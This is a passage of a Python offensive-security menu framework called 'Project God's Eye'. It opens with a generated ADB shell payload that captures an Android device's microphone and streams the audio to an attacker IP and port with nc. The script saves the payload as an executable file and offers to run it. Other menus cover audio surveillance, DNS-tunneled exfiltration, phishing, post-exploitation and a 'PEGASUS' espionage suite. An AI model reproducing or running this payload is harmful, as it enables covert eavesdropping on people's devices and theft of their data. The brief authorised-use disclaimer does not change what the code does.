adb shell am broadcast -a com.google.android.googlequicksearchbox.VOICE_ASSISTANT 2>/dev/null

echo "[*] Checking audio devices..."
adb shell dumpsys media_audio_flinger | grep -i mic -A 5

echo "[*] Attempting audio stream capture..."
adb shell "cat /dev/snd/pcmC0D0c 2>/dev/null" | nc {attacker_ip} {port}

echo "[+] Stream ended."
"""

    script_path = "/tmp/godseye_iot_hijack.sh"
    with open(script_path, "w") as f:
        f.write(script)
    os.chmod(script_path, 0o755)

    print(f"  {CYAN}[*] Payload ready: {script_path}{RESET}")
    print(f"  {CYAN}[*] On your listener, run: nc -lvnp {port} > captured_audio.raw{RESET}\n")

    ans = input(f"  {BOLD}Run payload now? [y/N]: {RESET}").strip().lower()
    if ans == "y":
        open_in_terminal("IoT Audio Hijack", script_path, wait=False)

    pause_prompt()


def audio_surveillance_menu():
    options = {
        "1": ("ffmpeg", "Capture / stream audio"),
        "2": ("sox", "Lightweight audio capture"),
        "3": ("dnscat2", "DNS-tunneled data exfiltration"),
        "4": ("steghide", "Hide audio inside images / audio files"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Audio Surveillance — IoT Listening Post ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {GREEN}[P]{RESET} Run IoT Audio Hijack PoC (ADB mic capture)")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c.lower() == "p":
            run_iot_audio_payload()
        elif c == "0":
            break


def integrations_menu():
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Integrations & External Tools ]{RESET}\n")
        print(f"  {GREEN}[1]{RESET} Aegis Cyber Gateway     {CYAN}->{RESET} Open Aegis portfolio in browser")
        print(f"  {GREEN}[2]{RESET} OSINT Framework          {CYAN}->{RESET} Open osintframework.com")
        print(f"  {GREEN}[3]{RESET} Shannon AI (LLM)         {CYAN}->{RESET} Clone & run Keygraph Shannon")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c == "1":
            open_url("https://aegiscybercomms.netlify.app/", "Aegis Cyber Gateway")
        elif c == "2":
            open_url("https://osintframework.com/", "OSINT Framework")
        elif c == "3":
            clone_and_run(
                "Shannon AI",
                "https://github.com/KeygraphHQ/shannon.git",
                "python3 shannon.py 2>/dev/null || python3 main.py 2>/dev/null || bash",
            )
        elif c == "0":
            break

# ─────────────────────────────────────────────────────────
# NEW: Cyber Espionage Menu
# ─────────────────────────────────────────────────────────

def cyber_espionage_menu():
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Cyber Espionage ]{RESET}\n")
        print(f"  {GREEN}[1]{RESET} PEGASUS   {CYAN}->{RESET} ADB-driven Android Device Toolkit")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c == "1":
            pegasus_menu()
        elif c == "0":
            break

def about():
    clear_screen()
    header()
    print(f"""  {CYAN}{"-" * 56}
  [!] PROJECT GOD'S EYE - CREDENTIALS REPORT
  {"-" * 56}{RESET}

  {BOLD}Architect{RESET}
  Vaishnav Rajeev - B.Tech Cyber Security
  Specialisation: OSINT, digital forensics, network security,Cyber espionage,Reconnaisance and Enumeration, Social Engineering,IoT and Embedded device security 
  scripting and automation,

  {BOLD}Core Contributors{RESET}
  Rishabh Gurnani - B.Tech Cyber Security
  Specialisation: Governance, risk & compliance (GRC),
  identity and multi-factor authentication

  {CYAN}{"-" * 56}
  Mission
  {"-" * 56}{RESET}
  God's Eye consolidates industry-standard reconnaissance
  and OSINT tools into a single, accessible framework for
  ethical hackers, security researchers, and defenders.

  All activities must be performed on systems you own or
  have explicit written authorisation to test.

  {CYAN}{"-" * 56}{RESET}
  {MAGENTA}Contact: vaishnav.cvv240888@cvv.ac.in{RESET}
  {CYAN}{"-" * 56}{RESET}
""")
    pause_prompt()


def main_menu():
    while True:
        clear_screen()
        header()

        if not check_internet():
            print(f"  {RED}[!] No internet connection detected.{RESET}\n")

        print(f"  {YELLOW}[ Reconnaissance ]{RESET}")
        print(f"  {GREEN}[1]{RESET} Host OSINT        {GREEN}[2]{RESET} DNS Recon")
        print(f"  {GREEN}[3]{RESET} Web Scan          {GREEN}[4]{RESET} Web Vuln")
        print(f"  {GREEN}[5]{RESET} Wireless Audit")

        print(f"\n  {YELLOW}[ Exploitation / Post-Exploit ]{RESET}")
        print(f"  {GREEN}[6]{RESET} Exploitation      {GREEN}[7]{RESET} Post-Exploit & Pivot")
        print(f"  {GREEN}[8]{RESET} Phishing / Social Eng")

        print(f"\n  {YELLOW}[ IoT / Audio ]{RESET}")
        print(f"  {GREEN}[9]{RESET} IoT & Hardware     {GREEN}[10]{RESET} Audio Surveillance")

        print(f"\n  {YELLOW}[ Anonymity ]{RESET}")
        print(f"  {GREEN}[11]{RESET} MAC Changer       {GREEN}[12]{RESET} IP Changer")
        print(f"  {GREEN}[13]{RESET} GOD'S FIX")

        print(f"\n  {YELLOW}[ Cyber Espionage ]{RESET}")
        print(f"  {GREEN}[14]{RESET} Cyber Espionage Suite (PEGASUS)")

        print(f"\n  {YELLOW}[ Integrations ]{RESET}")
        print(f"  {GREEN}[15]{RESET} External Tools & Integrations")

        print(f"\n  {YELLOW}[ Info ]{RESET}")
        print(f"  {GREEN}[16]{RESET} About / Authors")
        print(f"\n  {RED}[0]{RESET} Exit\n")

        c = input(f"  {BOLD}Vector: {RESET}").strip()

        routes = {
            "1": host_menu,
            "2": network_menu,
            "3": web_scan_menu,
            "4": web_vuln_menu,
            "5": wireless_menu,
            "6": exploitation_menu,
            "7": post_exploit_menu,
            "8": phishing_menu,
            "9": iot_menu,
            "10": audio_surveillance_menu,
            "11": mac_changer,
            "12": ip_changer,
            "13": gods_fix,
            "14": cyber_espionage_menu,
            "15": integrations_menu,
            "16": about,
        }

        if c in routes:
            routes[c]()
        elif c == "0":
            print(f"\n  {CYAN}[*] Session closed. Stay ethical.{RESET}\n")
            sys.exit(0)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n  {YELLOW}[!] Interrupted. Exiting cleanly.{RESET}\n")
        sys.exit(0)
